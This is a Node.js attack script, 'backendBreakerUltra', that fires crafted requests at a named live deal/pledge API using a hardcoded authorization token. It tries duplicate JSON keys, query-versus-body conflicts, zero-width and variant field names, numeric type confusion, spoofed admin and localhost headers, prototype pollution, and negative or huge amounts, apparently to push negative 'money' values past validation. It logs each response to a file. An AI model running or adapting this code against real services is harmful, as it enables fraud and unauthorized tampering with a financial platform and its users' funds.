const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
import fs from "fs";

const endpoint = 'https://fnn02.vip/api_deal/load/create';
const authHeader = 'TERc/9260xgILO4HuXsdtru5hUy4NZjhpkzd/DhE6dFVY5F/OeFmjKcyxdgfTmEri7QVcxVVCuCp9Gg95K1nIlSKv4Rl3pyHzkJR0ji1yw2Nqzp0srkvQoGkRHPBb8ydi99aFnkR00PeDAqHjmTAHY2mdp9pgnfKrAo3Aa7BwIU='

const resultsFile = 'ultra_results.json';

const translate = (msg) => {
  const dict = {
    "账户余额不足": "Insufficient account balance",
    "质押金额过低": "Pledged amount too low",
    "质押金额超限": "Pledged amount exceeds limit",
    "请选择一个有效的交易": "Please select a valid deal"
  };
  return dict[msg] || `Unknown error: ${msg}`;
};

const log = (strategy, payload, response, translated) => {
  const record = {
    strategy,
    payload,
    response,
    translated,
    timestamp: new Date().toISOString()
  };
  fs.appendFileSync(resultsFile, JSON.stringify(record, null, 2) + ',\n');
};

const send = async ({ url = endpoint, headers = {}, body, strategy, raw = false }) => {
  const res = await fetch(url, {
    method: 'POST',
    headers: {
      'Authorization': authHeader,
      'Content-Type': 'application/json',
      ...headers
    },
    body: raw ? body : JSON.stringify(body)
  });

  const type = res.headers.get('content-type');
  const text = await res.text();

  if (type && type.includes('application/json')) {
    const json = JSON.parse(text);
    const translated = json.error && /[\u4e00-\u9fa5]/.test(json.error)
      ? translate(json.error)
      : null;
    console.log(`✅ ${strategy}:`, json);
    if (translated) console.log('🈶 Translated:', translated);
    log(strategy, body, json, translated);
  } else {
    console.log(`⚠️ ${strategy} returned non-JSON:\n`, text.slice(0, 300));
    log(strategy, body, text, null);
  }
};

(async () => {
  console.log('🔥 Running backendBreakerUltra\n');

  // 1. Clean input
  await send({ strategy: 'clean', body: { deal_id: 7, money: 100 } });

  // 2. Duplicate fields
  await send({ strategy: 'duplicate-keys', raw: true, body: '{"deal_id":7,"money":100,"money":-100}' });

  // 3. Query vs body
  await send({
    strategy: 'query-vs-body',
    url: endpoint + '?money=100',
    body: { deal_id: 7, money: -100 }
  });

  // 4. Variant keys
  await send({
    strategy: 'field-variants',
    body: {
      deal_id: 7,
      money: 100,
      Money: -100,
      money_: -100,
      ['money\u200C']: -100
    }
  });

  // 5. Type confusion (numeric spoofing)
  const nums = ["0x64", "1e2", "100.0abc", "000100", 1e100, -0, Infinity];
  for (const n of nums) {
    await send({ strategy: `number-test-${n}`, body: { deal_id: 7, money: n } });
  }

  // 6. Header spoofing
  await send({
    strategy: 'header-injection',
    headers: {
      'X-Forwarded-For': '127.0.0.1',
      'X-User-ID': 'admin',
      'X-Real-IP': 'localhost'
    },
    body: { deal_id: 7, money: -100 }
  });

  // 7. Prototype pollution
  await send({
    strategy: 'proto-pollution',
    body: {
      deal_id: 7,
      money: 100,
      __proto__: { money: -100 },
      constructor: { money: -100 }
    }
  });

  // 8. Unicode confusion
  await send({
    strategy: 'unicode-bypass',
    body: {
      deal_id: 7,
      ['money']: -100, // looks like 'money'
      money: 100
    }
  });

  // 9. Logic abuse: zero, negative, huge
  for (const m of [-100, 0, 1e9]) {
    await send({ strategy: `logic-abuse-${m}`, body: { deal_id: 7, money: m } });
  }

  console.log('\n💣 backendBreakerUltra complete. Results in ultra_results.json');
})();
